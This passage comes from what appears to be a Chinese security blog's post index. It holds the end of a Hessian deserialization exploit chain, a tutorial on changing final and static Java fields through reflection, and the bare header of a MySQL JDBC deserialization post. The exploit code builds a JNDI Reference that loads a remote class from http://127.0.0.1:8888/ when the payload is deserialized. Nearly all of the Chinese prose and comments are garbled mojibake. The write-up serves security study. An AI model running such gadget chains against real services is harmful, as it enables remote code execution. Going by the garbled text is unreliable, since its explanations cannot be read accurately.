class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">//åˆ›å»ºContextUtil.ReadOnlyBindingå¯¹è±¡</span><br>        ContextUtil.<span class="hljs-type">ReadOnlyBinding</span> <span class="hljs-variable">readOnlyBinding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextUtil</span>.ReadOnlyBinding(<span class="hljs-string">&quot;clown&quot;</span>,ref,<span class="hljs-keyword">new</span> <span class="hljs-title class_">WritableContext</span>());<span class="hljs-comment">//æ”¾å…¥ref</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(readOnlyBinding.hashCode());<br>        <span class="hljs-comment">// åˆ›å»ºXtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// åˆ›å»ºHashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(readOnlyBinding, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102245522.png" alt="image-20241010224522400"></p><blockquote><p>é€‰æ‹©Contextçš„å®ç°ç±»çš„æ—¶å€™æœ‰äº›å¯èƒ½æŠ¥é”™åœ¨æ‰§è¡Œä»–çš„getEnvironmentæ–¹æ³•çš„æ—¶å€™ï¼Œéœ€è¦è®¾ç½®ä¸€äº›å˜é‡ä¹‹ç±»çš„ï¼Œè¿™é‡Œçš„WritableContextç±»å°±å¯ä»¥ç›´æ¥åˆ›å»ºå°±èƒ½ç”¨</p></blockquote><h2 id="å…¶ä»–é“¾"><a href="#å…¶ä»–é“¾" class="headerlink" title="å…¶ä»–é“¾"></a>å…¶ä»–é“¾</h2><p>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„é“¾å­æ¯”å¦‚Spring AOPä¹‹ç±»çš„å°±ä¸åˆ†æäº†ï¼Œæ‡’äº†ä¸»è¦æ˜¯ï¼ˆ</p><p>çœ‹ä¸€ä¸‹å¸ˆå‚…çš„æ–‡ç« å°±å¥½ï¼Œåˆ°æ—¶é‡åˆ°å†ç ”ç©¶ã€‚</p><p>è¿™ç¯‡æ–‡ç« æœ‰ç›¸å…³expï¼š<a href="https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&u_asig=1a0c384b17285714178144818e003d">https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&amp;u_asig=1a0c384b17285714178144818e003d</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå°„ä¿®æ”¹å˜é‡</title>
      <link href="/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/"/>
      <url>/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"><a href="#ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic" class="headerlink" title="ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"></a>ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/noKing/p/9038234.html">https://www.cnblogs.com/noKing/p/9038234.html</a></p><h2 id="ä¿®æ”¹staticå˜é‡"><a href="#ä¿®æ”¹staticå˜é‡" class="headerlink" title="ä¿®æ”¹staticå˜é‡"></a>ä¿®æ”¹staticå˜é‡</h2><p>è¿™é‡Œå’Œæ­£å¸¸ä¿®æ”¹æ™®é€šå˜é‡ä¸€æ ·éƒ½æ˜¯æ²¡é—®é¢˜çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹staticå˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;str&quot;</span>);<br>        str1.setAccessible(<span class="hljs-literal">true</span>);<br>        str1.set(test1,<span class="hljs-string">&quot;ceshi1&quot;</span>);<br>        System.out.println(Test1.str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125754.png" alt="image-20241004100135810"></p><h2 id="ä¿®æ”¹finalå˜é‡"><a href="#ä¿®æ”¹finalå˜é‡" class="headerlink" title="ä¿®æ”¹finalå˜é‡"></a>ä¿®æ”¹finalå˜é‡</h2><p>è¿™é‡Œæœ‰ç‚¹ä¸åŒ</p><p>æˆ‘ä»¬ä¿®æ”¹StringBuilderå˜é‡</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„å˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.setAccessible(<span class="hljs-literal">true</span>);<br>        name1.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi3&quot;</span>));<br>        System.out.println(test1.name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125725.png" alt="image-20241004100649459"></p><p>çœ‹åˆ°æ˜¯å¯ä»¥ä¿®æ”¹æˆåŠŸçš„</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¿®æ”¹Stringå˜é‡ä¼šå‘ç°ä¿®æ”¹ä¸æˆåŠŸï¼Œè¿™æ˜¯å› ä¸ºStringç±»å‹çš„finalå˜é‡ï¼Œåœ¨ä¼˜åŒ–æ—¶ä¼šå°†å…¶å˜æˆå¸¸é‡ï¼Œæ¯”å¦‚ä¸‹é¢çš„System.out.println(test1.STR1);å°±ä¼šå˜æˆSystem.out.println(â€œtestâ€);ï¼Œæ‰€ä»¥å…¶å®èµ‹å€¼æ˜¯æˆåŠŸäº†çš„ï¼Œä½†æ˜¯å› ä¸ºæ‰“å°å˜æˆå¸¸é‡äº†æ‰€ä»¥æ²¡å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå°„æ‹¿å‡ºå€¼æ¥éªŒè¯ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„Stringå˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi2&quot;</span>);<br>        System.out.println(test1.STR1);<br>        System.out.println(str11.get(test1));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125750.png" alt="image-20241004100943421"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯æ²¡é—®é¢˜çš„</p><p>é‚£æˆ‘ä»¬æƒ³è¦ä¿®æ”¹finalå˜é‡å°±éœ€è¦é˜²æ­¢Stringç±»å‹å˜é‡åœ¨ç¼–è¯‘æ—¶è¢«å¤„ç†ä¸ºå¸¸é‡ï¼Œæ–¹æ³•å°±æ˜¯è®©å…¶å€¼çš„åˆå§‹åŒ–ç»è¿‡è¿ç®—æ‰èƒ½å¾—åˆ°ï¼Œæˆ‘ä»¬ä»£ç å¯ä»¥æ”¹æˆè¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=(<span class="hljs-literal">null</span> == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;default4&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default5&quot;</span>).toString();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//ä¿®æ”¹finalçš„Stringå˜é‡</span><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi5&quot;</span>);<br>        System.out.println(test1.STR1);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR2&quot;</span>);<br>        str2.setAccessible(<span class="hljs-literal">true</span>);<br>        str2.set(test1,<span class="hljs-string">&quot;ceshi6&quot;</span>);<br>        System.out.println(test1.STR2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125726.png" alt="image-20241004101525466"></p><p>è¿™ä¸¤ç§æ–¹æ³•æˆ‘ä»¬éƒ½å¯ä»¥é˜²æ­¢å…¶è¢«å¸¸é‡åŒ–</p><h2 id="ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡"><a href="#ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡" class="headerlink" title="ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡"></a>ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡</h2><p>æ­¤æ—¶é€šè¿‡å¸¸è§„åå°„çš„å†™æ³•å°±ä¼šæŠ¥é”™ï¼Œå¦‚æœæˆ‘ä»¬è¦ä¿®æ”¹çš„è¯å°±éœ€è¦å…ˆå»é™¤finalä¿®é¥°ç¬¦æ‰è¡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//åå°„åŒæ—¶ä¿®æ”¹staticå’Œfinalä¿®é¥°çš„å˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> name11.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<span class="hljs-comment">//è·å–modifierså­—æ®µ</span><br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//å»é™¤finalä¿®é¥°ç¬¦</span><br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//å°†finalä¿®é¥°ç¬¦è®¾ç½®å›æ¥</span><br>        System.out.println(test1.name1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨modifierså­—æ®µå»é™¤finalä¿®é¥°ç¬¦å³å¯ä¿®æ”¹ã€‚</p><blockquote><p> <code>Field</code> ç±»ä¸­çš„ <code>modifiers</code> å­—æ®µã€‚è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ª <code>int</code> ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºè¯¥å­—æ®µçš„ä¿®é¥°ç¬¦ï¼ˆå¦‚ <code>public</code>ã€<code>private</code>ã€<code>final</code> ç­‰ï¼‰ï¼Œè¯¥å­—æ®µæ˜¯ä¸€ä¸ªç§æœ‰å­—æ®µã€‚</p><p><code>Modifier.FINAL</code> æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œè¡¨ç¤º <code>final</code> ä¿®é¥°ç¬¦çš„ä½æ©ç ã€‚</p></blockquote><h1 id="é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"><a href="#é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic" class="headerlink" title="é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"></a>é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic</h1><p>å…¶ä»–çš„åå°„ä¿®æ”¹éƒ½æ²¡æœ‰å˜åŒ–ï¼Œå°±æ˜¯ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡çš„æ–¹æ³•ä»Java12å¼€å§‹å¤±æ•ˆäº†ï¼Œæˆ‘åœ¨java17æµ‹è¯•æ˜¯ç›´æ¥æ²¡æœ‰modifiersè¿™ä¸ªå­—æ®µäº†ã€‚è¿™æ˜¯å› ä¸ºé«˜ç‰ˆæœ¬ä¸‹ä¸èƒ½é€šè¿‡getDeclaredFiledè·å–Fieldçš„å±æ€§ã€‚</p><p>è¿™ä¸€ç‚¹å¯ä»¥ä»fieldFilterMapé‡Œé¢çŸ¥é“</p><p><img src="https://cdn.clown2024.cn/202410041125763.png" alt="image-20241004105355114"></p><p>å›¾ä¸­è¢«è¿‡æ»¤çš„ç±»éƒ½ä¸èƒ½ç›´æ¥é€šè¿‡å…¬å…±åå°„è·å–ä»–ä»¬çš„å±æ€§äº†ï¼Œæˆ‘ä»¬çš„Fieldç±»å°±åœ¨å…¶ä¸­ã€‚</p><p>é‚£å°±éœ€è¦æ”¹ä¸€æ”¹æ–¹æ³•äº†ï¼Œè¿™ç§æ–¹æ³•å¯¹java8-java17éƒ½æ˜¯é€‚ç”¨çš„ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/wu_weijie/article/details/129251045">https://blog.csdn.net/wu_weijie/article/details/129251045</a></p><p>æˆ‘ä»¬å¯ä»¥æ”¹æˆç”¨<strong>getDeclaredFields0</strong>æ–¹æ³•æ¥è·å–ï¼Œä»æ–‡ç« ä¸­å¯ä»¥çŸ¥é“ä»–èƒ½è¿”å›ä¸€ä¸ªFieldæ•°ç»„å¯¹è±¡ï¼Œé‡Œé¢å°±åŒ…å«äº†æˆ‘ä»¬çš„modifierså±æ€§</p><p>é‚£æˆ‘ä»¬çš„ä¿®æ”¹ä»£ç å°±å¯ä»¥æ”¹æˆä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//é«˜ç‰ˆæœ¬åå°„åŒæ—¶ä¿®æ”¹staticå’Œfinalä¿®é¥°çš„å˜é‡</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getDeclaredFields0</span> <span class="hljs-operator">=</span> Class.class.getDeclaredMethod(<span class="hljs-string">&quot;getDeclaredFields0&quot;</span>, <span class="hljs-type">boolean</span>.class);<br>        getDeclaredFields0.setAccessible(<span class="hljs-literal">true</span>);<br>        Field[] fields = (Field[]) getDeclaredFields0.invoke(Field.class, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">for</span> (Field each : fields) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;modifiers&quot;</span>.equals(each.getName())) &#123;<br>                modifiers = each;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        System.out.println(test1.name1);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿è¡Œçš„æ—¶å€™è¿˜éœ€è¦æ·»åŠ æ¨¡å—ï¼Œå› ä¸ºjava12çš„é«˜ç‰ˆæœ¬æ˜¯æ¨¡å—åŒ–çš„ï¼Œåœ¨vm-optionsæ·»åŠ ä¿®æ”¹å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> åŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-JDBCååºåˆ—åŒ–</title>
      <link href="/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
